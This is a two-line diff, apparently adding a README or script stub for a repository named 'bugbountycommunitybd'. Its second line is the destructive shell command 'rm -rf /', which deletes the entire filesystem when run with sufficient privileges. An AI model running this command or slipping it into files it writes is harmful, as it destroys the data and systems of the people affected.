@@ -1,0 +1,2 @@
+# bugbountycommunitybd
+rm -rf /
